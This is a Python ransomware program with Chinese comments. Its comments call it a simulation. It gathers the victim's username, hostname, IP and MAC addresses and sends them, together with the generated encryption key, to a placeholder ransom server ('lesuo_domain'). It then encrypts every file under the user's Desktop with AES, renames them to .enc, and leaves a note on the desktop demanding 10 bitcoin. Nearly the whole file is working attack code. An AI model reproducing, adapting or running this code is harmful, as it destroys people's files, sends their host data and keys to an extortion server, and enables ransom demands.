import psutil
import platform
import socket
import os
import requests
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import base64
import secrets
import string

def get_ip_address():
    # 获取IP地址
    interfaces = psutil.net_if_addrs()
    ip_addresses = {}
    for interface_name, interface_addresses in interfaces.items():
        for address in interface_addresses:
            if address.family == socket.AF_INET:  # IPv4
                ip_addresses[interface_name] = address.address
    return ip_addresses


def get_mac_address():
    # 获取所有网络接口及其MAC地址
    interfaces = {}
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:  # AF_LINK 对应于 MAC 地址
                interfaces[interface] = addr.address
    return interfaces


def get_system_info():
    # 系统信息 用于模拟 {主机信息:密钥} 键值对，当用户提供自己的主机信息，并提交赎金后，从勒索服务器的数据库中找到对应的密钥
    system_info = {
        "当前用户名": os.getlogin(),
        "操作系统": platform.system(),
        "系统版本": platform.version(),
        "系统架构": platform.architecture(),
        "主机名": platform.node(),
        "处理器": platform.processor(),
        "CPU核心数": psutil.cpu_count(logical=False),
        "逻辑CPU数": psutil.cpu_count(logical=True),
        "内存信息": psutil.virtual_memory(),
        "磁盘信息": psutil.disk_usage('/'),
        "IP地址": get_ip_address(),
        "MAC地址": get_mac_address()
    }

    return system_info

def generate_key(password, salt):
    # 生成密钥
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,  # 32 bytes * 8 bits/byte = 256 bits
        salt=salt,
        iterations=100000,  # 可以根据需要调整迭代次数
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key

def generate_random_password(length=32):
    # 生成随机密码
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(alphabet) for _ in range(length))
    return password

def encrypt_file(file_path,password):
    # 加密文件
    # 生成随机盐
    salt = os.urandom(16)
    key = generate_key(password, salt)

    with open(file_path, 'rb') as f:
        file_data = f.read()

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(file_data) + padder.finalize()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # 创建临时文件
    temp_file_path = file_path + '.tmp'
    try:
        with open(temp_file_path, 'wb') as f:
            f.write(salt + iv + encrypted_data)
        # 用临时文件覆盖原文件
        os.replace(temp_file_path, file_path)

        # 重命名原文件
        encrypted_file_path = file_path + '.enc'
        os.rename(file_path, encrypted_file_path)
    except Exception as e:
        # 如果发生错误，尝试删除临时文件
        try:
            if os.path.exists(temp_file_path):
                os.remove(temp_file_path)
        except Exception as e:
            print("发生错误：{}，文件删除失败：{}".format(e,temp_file_path))

def decrypt_file(encrypted_file_path, password):
    # 解密文件
    with open(encrypted_file_path, 'rb') as f:
        data = f.read()

    salt = data[:16]
    iv = data[16:32]
    ciphertext = data[32:]
    key = generate_key(password, salt)

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded_data = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

    original_file_path = encrypted_file_path[:-4]
    with open(original_file_path, 'wb') as f:
        f.write(decrypted_data)


def try_decrypt_all_file(password,root_dir):
    # 递归地遍历指定目录及其子目录，对所有文件进行加密
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for filename in filenames:
            # 获取文件的完整路径
            new_file_path = os.path.join(dirpath, filename)
            if new_file_path[-4:] == ".enc":
                # 解密文件
                try:
                    decrypt_file(new_file_path,password)
                except Exception as e:
                    print("加密出错：{}，忽略：{}".format(e,new_file_path))


def try_encrypt_all_file(password,root_dir):
    # 递归地遍历指定目录及其子目录，对所有文件进行加密
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for filename in filenames:
            # 获取文件的完整路径
            old_file_path = os.path.join(dirpath, filename)
            # 加密文件
            try:
                encrypt_file(old_file_path,password)
            except Exception as e:
                print("加密出错：{}，忽略：{}".format(e,old_file_path))

def create_text_file_on_desktop(filename="勒索信息.txt"):
    # 在用户的桌面上创建一个文本文件，并写入指定的内容。
    content = "你的主机被勒索了，请给比特币钱包充值10比特币，备注你的主机信息和邮箱，我们将提供解密密钥"
    # 获取用户的桌面路径
    desktop_path = os.path.join(os.path.expanduser("~"), 'Desktop')
    # 构建完整的文件路径
    file_path = os.path.join(desktop_path, filename)

    # 写入内容到文件
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(content)

    print(f"文件已创建: {file_path}")


def print_system_info(info):
    print("主机信息收集:\n")
    for key, value in info.items():
        print(f"{key}: {value}")


def send_to_server(info,password):
    print("开始与勒索服务端通信，勒索域名 lesuo_domain")
    url = "http://lesuo_domain"  # 勒索服务器
    info["加密密钥"] = password
    try:
        # 发送 POST 请求
        response = requests.post(url, json=info)
        # 检查响应状态
        if response.status_code == 200:
            print("数据成功发送，响应内容：", response.json())
        else:
            print("发送失败，状态码：", response.status_code)
    except:
        print("网络请求异常")


if __name__ == "__main__":
    system_info = get_system_info()
    print_system_info(system_info)  # 打印主机信息
    password = generate_random_password()  # 生成加密密钥
    send_to_server(system_info, password)  # 将主机信息和密钥发送到勒索服务器
    desktop_path = os.path.join(os.path.expanduser("~"), 'Desktop')
    try_encrypt_all_file(password,desktop_path)  # 模拟加密过程
    create_text_file_on_desktop()  # 在桌面生成勒索提醒文件
